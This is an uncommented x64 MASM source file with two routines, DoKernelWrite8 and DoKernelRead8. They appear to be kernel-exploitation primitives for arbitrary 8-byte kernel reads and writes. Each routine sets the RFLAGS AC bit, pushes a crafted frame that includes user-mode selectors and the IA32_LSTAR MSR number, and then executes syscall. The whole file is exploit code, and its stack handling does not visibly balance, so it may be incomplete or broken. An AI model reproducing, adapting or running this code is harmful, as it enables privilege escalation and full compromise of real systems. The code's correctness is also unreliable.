.code

DoKernelWrite8 PROC
    push    rbx
    push    rbp
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15
    pushfq

    mov     r12, rcx
    mov     r13, rdx
    mov     r14, r8

    mov     r15, rsp

    pushfq
    or      qword ptr [rsp], 40000h
    popfq

    mov     rbx, [r14 + 00h]
    mov     rbp, [r14 + 08h]
    mov     rsi, [r14 + 10h]
    mov     rdi, [r14 + 18h]
    mov     r9,  [r14 + 20h]
    mov     r10, [r14 + 28h]

    push    2Bh
    push    r15
    pushfq
    push    33h
    lea     rax, [ring3_resume]
    push    rax

    push    r9
    push    rdi

    mov     rax, r10
    shr     rax, 32
    push    rax
    push    rsi

    mov     rax, r10
    mov     eax, eax
    push    rax
    push    rbp

    push    0C0000082h
    push    rbx

    mov     rax, r13
    mov     rdx, r12

    syscall

ring3_resume:
    popfq
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
    ret

DoKernelWrite8 ENDP

DoKernelRead8 PROC
    push    rbx
    push    rbp
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15
    pushfq

    mov     r12, rcx
    mov     r13, rdx
    mov     r14, r8

    mov     r15, rsp

    pushfq
    or      qword ptr [rsp], 40000h
    popfq

    mov     rbx, [r14 + 00h]
    mov     rbp, [r14 + 08h]
    mov     rsi, [r14 + 10h]
    mov     rdi, [r14 + 18h]
    mov     r9,  [r14 + 20h]
    mov     r10, [r14 + 28h]
    mov     r11, [r14 + 30h]

    push    2Bh
    push    r15
    pushfq
    push    33h
    lea     rax, [read_resume]
    push    rax

    push    r9
    push    rdi

    mov     rax, r10
    shr     rax, 32
    push    rax
    push    rsi

    mov     rax, r10
    mov     eax, eax
    push    rax
    push    rbp

    push    0C0000082h
    push    rbx

    push    r11
    push    r13
    push    rsi

    mov     rdx, r12
    mov     rbx, r12
    mov     rsi, r12
    mov     rdi, r12
    mov     rax, r12

    syscall

read_resume:
    popfq
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
    ret

DoKernelRead8 ENDP

end
